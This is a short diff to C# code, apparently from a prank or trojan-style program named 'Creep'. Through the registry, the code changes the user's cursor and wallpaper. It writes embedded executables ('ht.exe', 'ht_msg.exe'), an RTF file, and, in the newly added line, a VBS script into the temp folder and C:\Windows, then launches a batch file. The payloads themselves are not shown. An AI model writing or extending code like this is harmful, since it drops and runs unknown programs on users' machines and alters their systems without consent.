@@ -83,8 +83,6 @@ namespace Creep
             editKey.SetValue("Wait", @"C:\Windows\" + "cursor_ht.cur");
             editKey.Close();
 
-           
-
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
             editKey.SetValue("Wallpaper", @"C:\Windows\ht.jpg");
             editKey.Close();
@@ -102,6 +100,7 @@ namespace Creep
             System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
             System.IO.File.WriteAllBytes(temp + "ht.exe", Properties.Resources.subox);
             System.IO.File.WriteAllBytes(temp + "ht_msg.exe", Properties.Resources.ht_msg);
+            File.WriteAllBytes(temp + "np.vbs", Properties.Resources.np);
             System.IO.File.WriteAllBytes(@"C:\Windows\" + "ht.jpg", Properties.Resources.ht);
 
             ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
